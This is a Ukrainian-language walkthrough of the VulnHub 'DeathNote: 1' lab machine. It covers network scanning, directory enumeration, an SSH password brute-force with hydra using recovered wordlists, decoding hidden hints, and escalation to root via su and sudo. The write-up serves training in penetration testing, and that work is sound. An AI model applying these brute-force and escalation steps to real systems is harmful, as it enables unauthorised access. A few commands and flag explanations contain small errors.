### [https://www.vulnhub.com/entry/deathnote-1,739/](https://www.vulnhub.com/entry/deathnote-1,739/)

### Перша команда яку ми використовуємо —


```shell
   sudo netdiscover -r 10.0.2.0/24
```

```shell
   nmap -sC -sV -p- 192.168.0.152
```

- Параметр `-Pn` вимикає пінг — подібно `nmap` не перевіряє чи жива ціль за допомогою ping або SYN-сканування. Це корисно, коли хост фільтрує або блокує ping-запити.
- Параметр `-V` — виводиться більш "підсилена" інформація під час сканування.
- Бачимо два відкритих порти: **22** та **80**.
- Робити брутфорс на ssh (22) не має сенсу, до поки ми не маємо а ні **логіну**, а ні **паролю**.
- В браузері відкриваємо 10.0.2.Х з метою розуміння, який саме сервіс працює на **80** порті.
- Як результат маємо помилку, але маємо і підказку у вигляді доменного імені **deathnote.vuln**:
![[DeathNote.-1785424469737.webp]]

Копіюємо адресу та вставляємо в вікно браузера

![[DeathNote.-1785424731686.webp]]
- Робимо висновок, що нам потрібно зарезолвити це доменне ім'я, а це можно зробити за допомогою локального файла **hosts**, яким можна скористатись, як локальною альтернативою DNS.
### Для пошуку **hosts** застосовуємо команду:

```shell
whereis hosts
```

- `whereis` — команда, яка шукає файли, пов'язані з певним словом.
![[DeathNote.-1785424856322.webp]]

### Далі заходимо у текстовий редактор nano з правами адміністратора (root)

```shell
sudo nano /etc/hosts
```

- Вводимо IP:
```
192.168.0.152 deathnote.vuln
```
![[DeathNote.-1785425027429.webp]]

- Натискаємо Ctrl + X, переходимо в браузер та оновлюємо сторінку

![[DeathNote.-1785425229387.webp]]

- Відкриваємо Dev Tools та у HTML-коді знаходимо посилання на директорію, де була зберігається картинки, в назві яких міститься "kira".
![[DeathNote.-1785425360231.webp]]

```
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07
```

- Заходимо за цією адресою, бачимо багато файлів, і два з них у форматі `.txt` з іменами **notes** та **user**.

![[DeathNote.-1785425554146.webp]]

---
### Для сканування директорій використовуємо

```
dirsearch -u http://deathnote.vuln/
```

- або користуємось аналогами (**dirb** (присутня в Калі по замовчанню) або **gobuster**)

> Для використання її потрібно попередньо встановити командою:

```shell
sudo apt install dirsearch
```

- Параметр `-u` — вказує URL сайту, на якому потрібно провести brute-force директорій та файлів.

![[DeathNote.-1785425848976.webp|431]]

---

#### Ця команда вивела нам файли, серед них ми знайшли

```
/robots.txt  
/wordpress/wp-login.php
```

Заходимо на сторінку з `/robots.txt`
![[DeathNote.-1785425978830.webp]]

Нас зустрічає текст, який каже, що нам потрібно зайти на `/important.jpg`

![[DeathNote.-1785426036803.webp|559]]

При переході на /important.jpg нас зустрічає помилка
![[DeathNote.-1785426146963.webp]]

Тому запускаємо в терміналі команду

```
curl http://deathnote.vuln/important.jpg
```

![[DeathNote.-1785438094200.webp]]

- Це команда — інструмент для роботи з HTTP(S)-запитами, дозволяє завантажити вміст за вказаним URL.
- Отримуємо відповідь, у якій згадуються `user.txt` — може бути ідентифікатор, а також `notes.txt` — може бути список паролів. Шлях до каталогу, де знаходяться ці файли ми встановили, коли знайшли "kira".jpg за допомогою інспектора в браузері.

Заходимо ще раз на цю сторінку і прогортаємо вниз

![[DeathNote.-1785438204034.webp]]

- Відкриємо ці файли в новій вкладці та збережемо їх

![[DeathNote.-1785438282348.webp|579]]

```
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt

```

![[DeathNote.-1785438551839.webp|426]]

### Скористаємось інструментом для брут-форсу логінів і паролів `hydra`

```

hydra -L user.txt -P notes.txt 192.168.0.153 ssh

```

- Параметр `-L` — вказує файл із логінами.
- Параметр `-P` — вказує файл із паролями.
![[DeathNote.-1785438902594.webp]]

#### Заходимо через ssh порт з отриманими логіном і паролем (l:death4me)

```shell
shh l@192.168.0.153 
```

#### Після логінування через ssh в домашньому каталозі cеред файлів знаходимо `user.txt`, відкриваємо його.

![[DeathNote.-1785439133285.webp|506]]

![[DeathNote.-1785439211431.webp]]
#### Бачимо що текст написаний мовою `brainfuck`.
- Перекодовуємо його за допомогою `dcode.fr`.
![[DeathNote.-1785439490341.webp]]

Отримуємо:  _i think u got the shell , but you wont be able to kill me -kira_

#### Шукаємо по всієї файловій системі файли та директорії, які мають в назві "kira":

```
find / -name 'kira*' 2>/dev/null
```

![[DeathNote.-1785439788195.webp]]

#### Переміщуємось по директоріях командами:

```
cd ..
cd kira
cd /opt
cd kira-case

```

та переглядаємо файл:

```

case-file.txt
```

![[DeathNote.-1785439973163.webp|502]]
-  нам кажуть, що у директорії `fake-notebook-rule` щось є. Відкриваємо її
![[DeathNote.-1785440610811.webp]]
![[DeathNote.-1785440649719.webp]]

Використовуєм Cyberchef 
![[DeathNote.-1785440808467.webp]]

### Переходимо на юзера kira командою:

```

su kira
```

![[DeathNote.-1785440894246.webp|464]]

### Спробуємо використати той самий пароль для отримання суперкористувача:

```

sudo -i

```

![[DeathNote.-1785440935730.webp|412]]

- Змінюємо директорію:

```

cd /root

```

та переглядаємо файли:

```

ls

```

#### Знаходимо файл `root.txt` та виводимо.

![[DeathNote.-1785441002675.webp|617]]